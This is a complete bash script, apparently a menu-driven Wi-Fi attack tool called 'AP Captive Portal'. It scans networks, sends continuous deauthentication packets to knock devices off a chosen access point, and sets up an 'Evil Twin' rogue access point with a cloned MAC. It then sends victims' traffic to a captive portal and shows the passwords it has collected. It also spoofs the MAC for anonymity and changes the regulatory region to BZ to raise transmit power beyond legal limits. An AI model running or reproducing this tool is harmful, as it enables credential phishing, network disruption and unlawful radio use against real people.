#!/bin/bash

# Set variable default values
wifi="wlan0"
wifi2="wlan1"
eth="eth0"
cha="6"
cha2="11"
pow="20"
nam="MyNewAP"
mac="00:00:00:00:00:00"

# Get the config file
source ap.conf

# Function to restart the network interfaces and manager
resnet(){
	# Clear the terminal
	clear
	# Info 
	echo -e "\e[91mRestarting Network Manager and Interfaces\e[0m"
	sleep 2
	# Killing services WPA, NetworkManager...
	killall dhclient>/dev/null 2>&1 # hide any error
	killall wpa_supplicant>/dev/null 2>&1 # hide any error
	systemctl stop NetworkManager
	echo -n "........"
	sleep 1
	# Turn all network interfaces down
	for intd in /sys/class/net/*; do
		sudo ifconfig `basename $intd` down
	done
	echo -n "........"
	sleep 1	
	# Unblock all network interfaces
	rfkill unblock all
	echo -n "........"
	sleep 1
	# Turn all network interfaces up
	for intu in /sys/class/net/*; do
		ifconfig `basename $intu` up
	done
	echo -n "........"
	sleep 1
	# Start NetworkManager
	systemctl start NetworkManager
	echo -n "........"
	sleep 1
	# Info
	echo -e "\e[91m\nDone!\e[0m"
	# Use 1 for Pause and 0 for Exit
	pause 1
}

# Function to enable monitor mode (like airmon-ng start)
startmon(){
	ifconfig $wifi2 down
	iwconfig $wifi2 mode monitor
	rfkill unblock wifi
	ifconfig $wifi2 up
}

# Function to disable monitor mode (like airmon-ng stop)
stopmon(){
	ifconfig $wifi2 down
	iwconfig $wifi2 mode managed
	rfkill unblock wifi
	ifconfig $wifi2 up
}

# Function to set power of wifi signal
setpowtx(){
	# Clear the terminal
	clear
	# Info 
	echo -e "\e[91mThis only work on software lock for hardware lock you need patch the kernel or crda and wireless-regdb!!!\e[0m"
	sleep 3
	# Stopping Services WPA, Network Manager... (like airmon-ng check kill)
	echo "Stopping Network Services"
	sleep 1
	killall dhclient>/dev/null 2>&1 # hide any error
	killall wpa_supplicant>/dev/null 2>&1 # hide any error
	systemctl stop NetworkManager
	# Check you correcly region
	echo "Please check you correctly region"
	sleep 3
	iw reg get
	read -p "Press [Enter] key to continue..." fackEnterKey
	echo "Set new default region to BZ"
	sleep 2
	iw reg set BZ
	echo "Please check you new region"
	sleep 2
	iw reg get
	read -p "Press [Enter] key to continue..." fackEnterKey
	echo -e "Set new power $pow to $wifi and $wifi2"
	sleep 2
	# for $wifi
	sudo ip link set $wifi down
	sudo iw dev $wifi set txpower fixed 30mBm
	sudo ip link set $wifi up
	# for $wifi2
	sudo ip link set $wifi2 down
	sudo iw dev $wifi2 set txpower fixed 30mBm
	sudo ip link set $wifi2 up
	echo "Please check you new power"
	sleep 2
	# Show list if network cards info about TX power...	
	#iwconfig
	iw dev
	echo -e "\e[91mIf txpower no change to $pow my be you cards have hardware lock!\e[0m"
	pause 1
}


# Function to pause or exit
pause(){
	if [ "$1" = 1 ]
	then
		# Enable pause and continue on press ENTER
		read -p "Press [Enter] key to continue..." fackEnterKey
	else
		# Use Exit
		echo -e "\e[91m\nExiting to terminal...\e[0m\n"
		sleep 2
		# Clear the terminal
		clear
		# Exit to terminal
		exit 0
	fi
}

# Function WiFi Scanner
fun1(){
	# Clear the terminal
	clear
	# Info
	echo -e "Scans wireless networks in your area and displays extensive information: SSID, Channel, MAC...\e[91m\nTo PAUSE or RESUME scanning press SPACE\nFor STOP the scanning and BACK to main menu press CTRL+C\e[0m"
	sleep 3
	# Check if wifi2 device available if not exit to main menu and stop this code by return
	ifconfig $wifi2>/dev/null # Hide the output by achieved and appending it to a /dev/null
	if [ $? = 1 ]; then pause 1; return; fi
	# Start network card in monitoring mode
	startmon
	# Stopping Services WPA, Network Manager... (like airmon-ng check kill)
	killall dhclient>/dev/null 2>&1 # hide any error
	killall wpa_supplicant>/dev/null 2>&1 # hide any error
	systemctl stop NetworkManager
	# Start the scanner
	airodump-ng $wifi2
	# Stop network card in monitoring mode
	stopmon
	# Use 1 for Pause and 0 for Exit
	pause 1
}

# Function WiFi Deauther
fun2(){
	# Info
	if [ $1 = 1 ]
	then
		echo "Starting WiFi Deauther..."
	else
		# Clear the terminal
		clear		
		echo -e "A deauther allows you to disconnect devices from a WiFi network!\n\e[91mFor BACK to main menu close the new terminal window.\e[0m"
	fi
	sleep 3
	# Check if wifi2 device available if not exit to main menu and stop this code by return
	ifconfig $wifi2>/dev/null # Hide the output by achieved and appending it to a /dev/null
	if [ $? = 1 ]; then pause 1; return; fi
	# For security reason we change your MAC to randomly one ;)
	echo -e "Generate a Random MAC to $wifi2 for anonymity!"
	sleep 1
	ifconfig $wifi2 down
	macchanger -r $wifi2
	ifconfig $wifi2 up
	# Start network card in monitoring mode
	startmon
	# Stopping Services WPA, Network Manager... (like airmon-ng check kill)
	killall dhclient>/dev/null 2>&1 # hide any error
	killall wpa_supplicant>/dev/null 2>&1 # hide any error
	systemctl stop NetworkManager
	# Start send packet to selected channel and MAC address in variables on top
	iwconfig $wifi2 channel $cha2
	# Open the packet sender in new terminal window or keep it on current terminal window?
	if [ $1 = 1 ]
	then
		sleep 1
		xterm aireplay-ng -0 0 -a $mac $wifi2
		#aireplay-ng -0 0 -a $mac $wifi2>/dev/null & # hidde the output and add to task
		#echo "WiFi Deauther Working..."
		#sleep 2
		#read -p "Press [Enter] key to STOP the WiFi Deauther!" fackEnterKey
		#kill %1 # Kill the task 1
		echo "WiFi Deauther Stopped!"
		sleep 2
	else
		xterm -e aireplay-ng -0 0 -a $mac $wifi2
	fi 
	# Stop network card in monitoring mode
	stopmon
	echo "Reset MAC address to original permanent hardware value!"
	sleep 1
	ifconfig $wifi2 down
	macchanger -p $wifi2
	ifconfig $wifi2 up
	# Use 1 for Pause and 0 for Exit
	if [ $1 != 1 ]; then pause 1; fi
}

# Function Create AP with Captive Portal
fun3(){
	# Clear the terminal
	clear
	# Info
	echo -e "Creating AP with Captive Portal Authorization\n\e[91mFor STOP the AP press ENTER then again ENTER for BACK to main menu\e[0m"
	sleep 3
	# Check if wifi device available if not exit to main menu and stop this code by return
	ifconfig $wifi>/dev/null # Hide the output by achieved and appending it to a /dev/null
	if [ $? = 1 ]; then pause 1; return; fi
	# Check if ethernet device available if not exit to main menu and stop this code by return
	ifconfig $eth>/dev/null # Hide the output by achieved and appending it to a /dev/null
	if [ $? = 1 ]; then pause 1; return; fi
	# For security reason we change your MAC to randomly one or clone of attack AP "Evil Twin" ;)
	ifconfig $wifi down
	if [ "$1" = 1 ]
	then
		echo -e "\e[36mClone MAC to $wifi of attack AP for Evil Twin!"
		sleep 1	
		macchanger -m $mac $wifi
	else
		echo -e "\e[36mGenerate a Random MAC to $wifi for anonymity!"
		sleep 1	
		macchanger -r $wifi
	fi
	ifconfig $wifi up
	# Stopping Services WPA, Network Manager... (like airmon-ng check kill)
	echo ">>> Stopping Network Services"
	sleep 1
	killall dhclient>/dev/null 2>&1 # hide any error
	killall wpa_supplicant>/dev/null 2>&1 # hide any error
	systemctl stop NetworkManager
	# BackingUp or Creating if not exist hostapd.conf
	echo ">>> Backing Up/Creating hostapd.conf"
	sleep 1
	if [ -f /etc/hostapd/hostapd.conf ]; then mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.BAK; fi
	echo -e "interface=$wifi\ndriver=nl80211\nssid=$nam\nhw_mode=g\nchannel=$cha\nignore_broadcast_ssid=0">/etc/hostapd/hostapd.conf
	# BackingUp or Creating if not exist dnsmasq.conf
	echo -e ">>> Backing Up/Creating dnsmasq.conf"
	sleep 1
	if [ -f /etc/dnsmasq.conf ]; then mv /etc/dnsmasq.conf /etc/dnsmasq.BAK; fi
	echo -e "no-resolv\ninterface=$wifi\ndhcp-range=10.0.0.2,10.0.0.101,12h\nserver=8.8.8.8\nserver=8.8.4.4">/etc/dnsmasq.conf
	# Adding routes to the iptables of linux
	echo ">>> Adding routes to iptables"
	sleep 1
	# Set Rules
	iptables -t mangle -N captiveportal # Create new chain captiveportal
	iptables -t mangle -A PREROUTING -i $wifi -j captiveportal # All trafic from $wifi send to captiveportal chain
	iptables -t mangle -A PREROUTING -i $wifi -p udp --dport 53 -j RETURN # Return all DNS traffic
	iptables -t mangle -A captiveportal -j MARK --set-mark 1 # If user still in the chain mark him!
	iptables -t nat -A PREROUTING -i $wifi -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1 # Redirecting traffic to local captive portal!
	sysctl -w net.ipv4.ip_forward=1>/dev/null # Enable kernel ip_forward and hide the output by achieved and appending it to a /dev/null
	# Match remaining trusted users	
	iptables -A FORWARD -i $wifi -j ACCEPT
	iptables -t nat -A POSTROUTING -o $eth -j MASQUERADE
	# Start local http server
	echo ">>> Starting Apache2 Service"
	sleep 1
	systemctl start apache2
	# Configuring network interface to local host ip
	echo -e ">>> Configuring $wifi"
	sleep 1
	ifconfig $wifi up 10.0.0.1 netmask 255.255.255.0
	# Start dnsmasq
	echo ">>> Turning on dnsmasq"
	sleep 1
	if [ -z "$(ps -e | grep dnsmasq)" ]; then dnsmasq & fi
	# Start hostapd
	echo ">>> Starting hostapd"
	sleep 1
	hostapd -B /etc/hostapd/hostapd.conf 1>/dev/null # Hide the output by achieved and appending it to a /dev/null
	# Print channel, done and change terminal text color to "NONE"
	echo -e ">>> Channel: $cha\n>>> Done!\e[0m"
	# Use WiFi Deauther?
	local choicewd
	read -p "Start WiFi Deauther? Y/N?" choicewd
	case $choicewd in
	  	y|Y ) fun2 1 ;;
		n|N ) echo "Skipping to start WiFi Deauther..." && sleep 1 ;;
		* ) echo "Invalid Key! Skipping..." && sleep 2
	esac
	# Pause AP is working...
	read -p "Press [Enter] key to STOP the AP..." fackEnterKey
	# Enter Key pressed now stoping the AP
	echo -e "\e[91m>>> Cleaning up and stop the AP"
	sleep 1
	# Convert global virable to local
	local x="$wifi"
	local z="$eth"
	# Stop dnsmasq service
	echo -e "\e[36m>>> Killing dnsmasq"
	sleep 1
	pkill dnsmasq
	# Stop hostapd service
	echo ">>> Killing hostapd"
	sleep 1
	pkill hostapd
	# Restoring hostapd.conf from backup
	echo ">>> Restoring hostapd.conf"
	sleep 1
	if [ -f /etc/hostapd/hostapd.BAK ]; then mv /etc/hostapd/hostapd.BAK /etc/hostapd/hostapd.conf; fi
	# Restoring dnsmasq.conf from backup
	echo ">>> Restoring dnsmasq.conf"
	sleep 1
	if [ -f /etc/dnsmasq.BAK ]; then mv /etc/dnsmasq.BAK /etc/dnsmasq.conf; fi
	# Restoring iptables to default value
	echo ">>> Restoring iptables"
	sleep 1	
	# Restoring Rules
	iptables -t mangle -D PREROUTING -i $x -p udp --dport 53 -j RETURN
	iptables -t mangle -D PREROUTING -i $x -j captiveportal
	iptables -t mangle -D captiveportal -j MARK --set-mark 1
	iptables -t nat -D PREROUTING -i $x  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
	iptables -D FORWARD -i $x -j ACCEPT
	iptables -t nat -D POSTROUTING -o $z -j MASQUERADE
	iptables -t nat -F
	iptables -t nat -X
	iptables -t mangle -F
	iptables -t mangle -X
	# Stop Apache2 service
	echo ">>> Stopping Apache2 Service"
	sleep 1
	systemctl stop apache2
	echo "Reset MAC address to original permanent hardware value!"
	sleep 2
	ifconfig $wifi down
	macchanger -r $wifi
	ifconfig $wifi up
	# Print we done and change terminal text color to "NONE"
	echo -e ">>> Done!\e[0m"
	# Use 1 for Pause and 0 for Exit
	pause 1
}

# Function four (Show Network Cards on system)
fun4(){
	# Clear the terminal
	clear
	echo -e "Here you can see network cards on you system wlan0, eth0....\n\e[91mHelpful for configuration the ap.conf file\e[0m"
	sleep 3
	# Show list of network cards you can use one of this commands ip a, ip link show, ifconfig -a
	ifconfig -a
	# Use 1 for Pause and 0 for Exit
	pause 1
}

# Function five (Show the passwords.txt)
fun5(){
	# Clear the terminal
	clear
	# Info
	echo -e "Here you can see saved passwords from captiveportal in passwords.txt file\n\e[91mFor BACK to main menu please write :q\nYou can use the Quick Scroll by PageUp/PageDown keys\e[0m"
	sleep 3
	# Open the passwords.txt can use cat ot less
	less passwords.txt
	# Use 1 for Pause and 0 for Exit
	pause 1
}

# Function fix (Open the ap.conf file for edit in terminal)
fun6(){
	# Clear the terminal
	clear
	# Info
	echo -e "Here you can config the ap.conf file of the AP script\n\e[91mTo Save press CTRL+O and ENTER or CTRL+S\nFor EXIT press CTRL+X\e[0m"
	sleep 3
	# Open the config file in terminal editor
	nano ap.conf
	# Use 1 for Pause and 0 for Exit
	pause 0
}
 
# Function to display main menu
show_menus() {
	clear
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo "~  Welcome to AP Captive Portal v1.0  ~"
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo "1. WiFi Scanner"
	echo "2. WiFi Deauther"
	echo "3. Create AP with Captive Portal"
	echo "4. Show Available Network Cards"
	echo "5. Show the passwords.txt"
	echo "6. Config the ap.conf"
	echo "7. Restart Network Manager"
	echo "8. Increase WiFi Power"
	echo "9. Exit"
}

# Function to read input from the keyboard and take a action!
read_options(){
	local choice
	local choicetw
	read -p "Enter choice [ 1 - 9 ] " choice
	case $choice in
		1) fun1 ;;
		2) fun2 0 ;;
		3) read -p "Use Evil Twin? Y/N?" choicetw
		case $choicetw in 
		  y|Y ) echo "Using MAC from attack AP" && sleep 3 && fun3 1 ;;
			n|N ) echo "Using Randomly MAC" && sleep 3 &&  fun3 0 ;;
			* ) echo "Invalid Key!" && sleep 2
		esac;;
		4) fun4 ;;
		5) fun5 ;;
		6) fun6 ;;
		7) resnet ;;
		8) setpowtx ;;
		9) clear; exit 0 ;;
		*) echo -e "\e[91mInvalid number!\e[0m" && sleep 2
	esac
}

# Trap CTRL+C, CTRL+Z, CTRL+D... singles for nothing to do!
trap '' SIGINT SIGTSTP SIGQUIT SIGTERM  SIGHUP

# Main logic infinite loop
while true
do
	show_menus
	read_options
done
